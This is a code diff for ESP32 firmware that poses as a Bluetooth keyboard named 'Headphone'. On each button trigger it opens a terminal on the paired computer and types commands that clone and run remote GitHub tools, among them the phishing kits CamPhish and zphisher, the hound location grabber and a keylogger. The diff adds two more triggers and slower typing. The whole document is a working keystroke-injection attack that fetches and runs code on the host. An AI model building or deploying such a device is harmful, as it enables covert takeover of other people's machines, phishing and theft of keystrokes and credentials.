@@ -20,6 +20,8 @@
 #define BUTTON_16_PIN 11  // Trigger 16
 #define BUTTON_17_PIN 27  // Trigger 17
 #define BUTTON_18_PIN 20  // Trigger 18
+#define BUTTON_19_PIN 29  // Trigger 19
+#define BUTTON_20_PIN 30  // Trigger 20
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -43,12 +45,22 @@ bool lastState15 = HIGH;
 bool lastState16 = HIGH;
 bool lastState17 = HIGH;
 bool lastState18 = HIGH;
+bool lastState19 = HIGH;
+bool lastState20 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
     bleKeyboard.print(s[i]);
     delay(charDelay);
+  }
+}
+
+// Helper: slow typing function
+void sendStringSlow(const char *s, unsigned long charDelayMs = 120) {
+  for (size_t i = 0; s[i] != '\0'; ++i) {
+    bleKeyboard.print(s[i]);   // send single character
+    delay(charDelayMs);        // wait so the host processes each char
   }
 }
 
@@ -81,6 +93,8 @@ void setup() {
   pinMode(BUTTON_16_PIN, INPUT_PULLUP);
   pinMode(BUTTON_17_PIN, INPUT_PULLUP);
   pinMode(BUTTON_18_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_19_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_20_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -105,6 +119,8 @@ void loop() {
     bool state16 = digitalRead(BUTTON_16_PIN);
     bool state17 = digitalRead(BUTTON_17_PIN);
     bool state18 = digitalRead(BUTTON_18_PIN);
+    bool state19 = digitalRead(BUTTON_19_PIN);
+    bool state20 = digitalRead(BUTTON_20_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -435,115 +451,140 @@ void loop() {
 
     // Trigger 13:
     if (lastState13 == HIGH && state13 == LOW) {
-      Serial.println("Trigger 13: clone repo and run script");
+      Serial.println("Trigger 13: clone repo and run script (slow typing)");
 
+      // Open terminal (Ctrl+Alt+T)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
-      delay(100);
+      delay(120);
       bleKeyboard.releaseAll();
-      delay(500);
+      delay(700); // let terminal open
 
-      // Git clone
-      sendString("git clone https://github.com/techchipnet/CamPhish");
+      // Git clone (type slowly)
+      sendStringSlow("git clone https://github.com/techchipnet/CamPhish", 150);
       bleKeyboard.press(KEY_RETURN);
-      delay(3000); 
-      sendString("cd CamPhish");
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd CamPhish", 130);
       bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      sendString("bash camphish.sh");
+      delay(800);
+
+      // run script
+      sendStringSlow("bash camphish.sh", 130);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
     // Trigger 14:
     if (lastState14 == HIGH && state14 == LOW) {
-      Serial.println("Trigger 14: clone repo and run script");
+      Serial.println("Trigger 14: clone repo and run script (slow typing)");
 
+      // Open terminal (Ctrl+Alt+T)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
-      delay(100);
+      delay(120);
       bleKeyboard.releaseAll();
-      delay(500);
+      delay(700); // let terminal open
 
-      // Git clone
-      sendString("git clone --depth=1 https://github.com/htr-tech/zphisher.git");
+      // Git clone (type slowly)
+      sendStringSlow("git clone --depth=1 https://github.com/htr-tech/zphisher.git", 160);
       bleKeyboard.press(KEY_RETURN);
-      delay(3000); 
-      sendString("cd zphisher");
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd zphisher", 130);
       bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      sendString("bash zphisher.sh");
+      delay(800);
+
+      // run script
+      sendStringSlow("bash zphisher.sh", 130);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
     // Trigger 15:
     if (lastState15 == HIGH && state15 == LOW) {
-      Serial.println("Trigger 15: clone repo and run script");
+      Serial.println("Trigger 15: clone repo and run script (slow typing)");
 
+      // Open terminal (Ctrl+Alt+T)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
-      delay(100);
+      delay(120);
       bleKeyboard.releaseAll();
-      delay(500);
+      delay(700); // let terminal open
 
-      // Git clone
-      sendString("git clone https://github.com/techchipnet/hound");
+      // Git clone (type slowly)
+      sendStringSlow("git clone https://github.com/techchipnet/hound", 160);
       bleKeyboard.press(KEY_RETURN);
-      delay(3000); 
-      sendString("cd hound");
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd hound", 150);
       bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      sendString("bash hound.sh");
+      delay(800);
+
+      // run script
+      sendStringSlow("bash hound.sh", 150);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
     // Trigger 16:
     if (lastState16 == HIGH && state16 == LOW) {
-      Serial.println("Trigger 16: clone repo and run script");
+      Serial.println("Trigger 16: clone repo and run script (slow typing)");
 
+      // Open terminal (Ctrl+Alt+T)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
-      delay(100);
+      delay(120);
       bleKeyboard.releaseAll();
-      delay(500);
+      delay(700); // let terminal open
 
-      // Git clone
-      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git");
+      // Git clone (type slowly)
+      sendStringSlow("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 180);
       bleKeyboard.press(KEY_RETURN);
-      delay(5000); 
-      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-");
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd File-Encryption-Awareness-Project-Ethical-Demo-", 160);
       bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      sendString("python3 code.py");
+      delay(800);
+
+      // run script
+      sendStringSlow("python3 code.py", 150);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
     // Trigger 17:
     if (lastState17 == HIGH && state17 == LOW) {
-      Serial.println("Trigger 17: clone repo and run script");
+      Serial.println("Trigger 17: clone repo and run script (slow typing)");
 
+      // Open terminal (Ctrl+Alt+T)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
-      delay(100);
+      delay(120);
       bleKeyboard.releaseAll();
-      delay(500);
+      delay(700); // let terminal open
 
-      // Git clone
-      sendString("git clone https://github.com/sachinpandey7709/Keylogger.git");
+      // Git clone (type slowly)
+      sendStringSlow("git clone https://github.com/sachinpandey7709/Keylogger.git", 140);
       bleKeyboard.press(KEY_RETURN);
-      delay(3000); 
-      sendString("cd Keylogger");
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd Keylogger", 120);
       bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      sendString("python3 keylogger.py");
+      delay(800);
+
+      // run script
+      sendStringSlow("python3 keylogger.py", 120);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
@@ -594,6 +635,62 @@ void loop() {
       delay(5000);
       }
 
+      // Trigger 19:
+    if (lastState19 == HIGH && state19 == LOW) {
+      Serial.println("Trigger 19: clone repo and run script (slow typing)");
+
+      // Open terminal (Ctrl+Alt+T)
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(120);
+      bleKeyboard.releaseAll();
+      delay(700); // let terminal open
+
+      // Git clone (type slowly)
+      sendStringSlow("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 180);
+      bleKeyboard.press(KEY_RETURN);
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd Secret-Messaging", 150);
+      bleKeyboard.press(KEY_RETURN);
+      delay(800);
+
+      // run script
+      sendStringSlow("python3 code2.py", 140);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
+    // Trigger 20:
+    if (lastState20 == HIGH && state20 == LOW) {
+      Serial.println("Trigger 20: clone repo and run script (slow typing)");
+
+      // Open terminal (Ctrl+Alt+T)
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(120);
+      bleKeyboard.releaseAll();
+      delay(700); // let terminal open
+
+      // Git clone (type slowly)
+      sendStringSlow("git clone https://github.com/sachinpandey7709/Password-Manager.git", 180);
+      bleKeyboard.press(KEY_RETURN);
+      delay(6000); // wait for clone to complete (increase if slow internet)
+
+      // cd into folder
+      sendStringSlow("cd Password-Manager", 150);
+      bleKeyboard.press(KEY_RETURN);
+      delay(800);
+
+      // run script
+      sendStringSlow("python3 password.py", 150);
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
 
     // update last states
     lastState1 = state1;
@@ -614,6 +711,8 @@ void loop() {
     lastState16 = state16;
     lastState17 = state17;
     lastState18 = state18;
+    lastState19 = state19;
+    lastState20 = state20;
   }
 
   delay(10); // Small debounce
